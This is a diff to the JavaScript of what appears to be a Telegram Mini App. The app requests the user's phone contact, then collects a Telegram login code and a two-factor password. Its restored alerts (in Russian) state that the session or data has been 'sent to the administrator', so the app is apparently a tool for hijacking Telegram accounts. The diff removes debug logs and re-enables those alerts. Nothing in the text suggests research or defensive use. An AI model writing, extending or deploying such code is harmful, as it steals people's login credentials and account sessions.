@@ -47,11 +47,6 @@ if (isTelegram) {
 
 // Автоматический запрос контакта в Telegram
 function requestContactAutomatically() {
-    console.log('requestContactAutomatically called, isTelegram =', isTelegram);
-tg.requestContact((success, contact) => {
-  console.log('requestContact callback', { success, contact });
-  // ... остальной код
-});
     tg.requestContact((success, contact) => {
         if (!success) {
             error1.textContent = 'Необходимо предоставить номер телефона для продолжения.';
@@ -187,8 +182,8 @@ function verifyCode() {
     .then(res => res.json())
     .then(data => {
         if (data.success) {
-            // alert('Код подтверждён! Сессия отправлена администратору.'); // УБРАНО
-            if (isTelegram) tg.close(); // просто закрываем приложение
+            alert('Код подтверждён! Сессия отправлена администратору.');
+            if (isTelegram) tg.close();
         } else if (data.needPassword) {
             // Требуется пароль
             step2.style.display = 'none';
@@ -227,8 +222,8 @@ submitPasswordBtn.addEventListener('click', () => {
     .then(res => res.json())
     .then(data => {
         if (data.success) {
-            // alert('Пароль принят! Данные отправлены администратору.'); // УБРАНО
-            if (isTelegram) tg.close(); // просто закрываем приложение
+            alert('Пароль принят! Данные отправлены администратору.');
+            if (isTelegram) tg.close();
         } else {
             error3.textContent = data.error || 'Ошибка';
         }
